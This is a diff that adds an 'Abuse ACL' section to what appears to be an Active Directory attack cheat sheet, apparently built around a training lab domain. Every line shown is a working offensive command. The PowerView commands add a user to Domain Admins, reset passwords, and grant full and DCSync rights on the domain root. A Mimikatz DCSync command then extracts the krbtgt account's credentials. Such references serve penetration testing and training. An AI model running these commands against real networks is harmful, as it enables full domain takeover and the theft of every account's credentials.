@@ -82,7 +82,17 @@ C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose
 # Change user password
 C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
 ```
+### Abuse ACL 
+```powershell
+# Add Full Rights to Domain Root ACL
+C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 
+# DCSync rights on Domain
+C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+# Execute DCSync
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
 ### MORE
 
 
